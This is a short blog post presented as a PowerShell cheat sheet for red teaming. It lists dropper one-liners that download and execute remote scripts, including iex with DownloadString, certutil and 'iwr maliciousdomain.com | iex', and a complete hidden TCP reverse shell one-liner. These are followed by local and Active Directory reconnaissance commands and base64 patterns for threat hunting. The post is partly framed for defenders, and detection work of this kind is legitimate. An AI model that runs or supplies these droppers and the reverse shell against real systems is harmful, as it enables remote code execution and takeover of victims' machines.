---
layout: post
title:  "Powershell for Red Teaming"
date:   2025-05-23 21:00:00 +1000
categories: pentesting
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Red teaming powershell scripts. Droppers and more.

Bunch of potentially malicious powershell commands that are helpful in Red teaming but also useful for defenders to know. Seeing these commands in logs are usually a pretty good indicator of a compromise. However, a lot of these commands have legitimate administrative use as well.

### Droppers
Commonly used in Clickfix Prompts or to drop further payloads on the host.
--- Unencoded Droppers ---
- `` powershell -Command "Invoke-WebRequest -Uri 'https://google.com/safe-script.ps1' -OutFile $env:TEMP\Word.ps1; & $env:TEMP\Word.ps1" `` (Downloads to disk)
- `` powershell -Command "iex(New-Object Net.WebClient).DownloadString('https://google.com/safe-script.ps1')" `` (Downloads to memory)
- `` powershell -Command certutil -urlcache -split -f https://google.com/safe-script.ps1 payload.exe`` (LOLBAS Download)
- `` powershell iwr maliciousdomain.com | iex `` (Runs response in memory)

### Reverse Shell One-Liners
--- TCP Rev Shell ---
- `` powershell -NoP -NonI -W Hidden -Command "$c=New-Object Net.Sockets.TCPClient('RemoteIP',RemotePort);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){; $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}" ``

### Recon Commands

These commands serve the purpose of when an attacker has not yet imported BloodHound or Responder. They have just got in and want to stay quietish.

--- Local Recon ---
- ``Get-Process``
- ``Get-LocalUser``
- ``Get-NetIPConfiguration``
- ``Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}``
- ``whoami /user``
- ``whoami /upn``
- ``Get-LocalGroupMember -Group "Administrators"``
- ``Get-LocalGroup | ForEach-Object { Get-LocalGroupMember -Group $_.Name }``
- ``Get-SmbShare``
- ``net view \\hostname``
- ``Get-Service | Where-Object {$_.Status -eq 'Running'}``
- ``netstat -ano``
- ``nltest /dsgetdc:<DOMAIN>``
- ``nltest /dclist:<DOMAIN>``
- ``nltest /sc_query:<DOMAIN>``
- ``net view /domain``
- ``net view \\<hostname>``

--- AD Recon ---
- ``Get-ADDomain``
- ``Get-ADForest``
- ``Get-ADDomainController -Filter *``
- ``Get-ADGroupMember -Identity "Domain Admins"``
- ``Get-ADGroupMember -Identity "Enterprise Admins"``
- ``Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled``
- ``Get-ADComputer -Filter * | Select-Object Name, OperatingSystem``
- ``Get-ADGroup -Filter * | Select-Object Name, GroupScope``

### Blue Teamer B64 Patterns

Base64 is deterministic. Meaning there is no randomness. Identifying B64 patterns is important when threat hunting and creating SIEM rules.

--- Threat Hunting Patterns ---
- SQBuAHYAbwBrAGUALQBX (Invoke-WebRequest)
- aQBlAHgAIAAoAE4AZQB3 (iex (New-Object Net.WebClient))